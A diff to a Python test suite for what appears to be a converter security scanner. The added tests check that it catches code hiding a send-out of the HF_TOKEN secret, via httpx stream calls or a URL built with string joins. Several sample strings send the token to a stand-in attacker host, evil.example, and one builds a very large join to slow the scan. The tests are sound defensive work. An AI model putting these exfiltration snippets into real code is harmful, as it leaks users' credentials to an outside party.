@@ -3401,6 +3401,11 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
     for body in (
         'import os\nimport requests\n' + hub
         + 'post = requests.post\npost(HUB, data = os.environ["HF_TOKEN"])\n',
+        # httpx takes the method as an argument here, so stream is a write the
+        # named methods do not cover, same as request and send.
+        'import os\nimport httpx\n' + hub
+        + 'c = httpx.Client()\n'
+        + 'c.stream("POST", HUB, content = os.environ["HF_TOKEN"])\n',
         'import os\nimport requests\n' + hub
         + 'getenv = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
@@ -3429,6 +3434,49 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + '    headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
         + 'requests.get(HUB, headers = headers)\n'
     ) == []
+
+
+def test_an_oversized_join_is_not_folded():
+    """A join multiplies, unlike + and %, whose result is bounded by the source
+    that spells it. A 100 KB separator with 10000 elements is 130 KB of source
+    and a 1 GB string: measured at 15.7 seconds and 1.7 GB resident inside the
+    decision about whether an export may run.
+
+    Over the ceiling the join is simply not folded, which is safe in the other
+    direction too: the walk then reads the separator and the elements
+    individually, so a destination hidden in one is still seen.
+    """
+    module = _load("converter_scan_join_size_probe", "unsloth_zoo/converter_scan.py")
+    separator = "A" * 100_000
+    elements = ",".join(['""'] * 10_000)
+    preamble = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'token = os.environ["HF_TOKEN"]\n'
+    )
+    started = time.perf_counter()
+    module.scan_converter_source(
+        preamble + f'X = "{separator}".join([{elements}])\n'
+        'requests.get(HUB, headers = {"a": token})\n'
+    )
+    assert time.perf_counter() - started < 5
+
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + f'X = "{separator}".join([{elements}, "https://evil.example/c"])\n'
+            'requests.get(X, headers = {"a": token})\n'
+        )
+    ], "an oversized join must not hide the literals inside it"
+
+    # A join small enough to fold is still folded.
+    assert [
+        f.check for f in module.scan_converter_source(
+            preamble
+            + 'requests.get("".join(("htt", "ps://ev", "il.example/c")) + token)\n'
+        )
+    ]
 
 
 def test_nothing_in_the_allowance_may_raise():
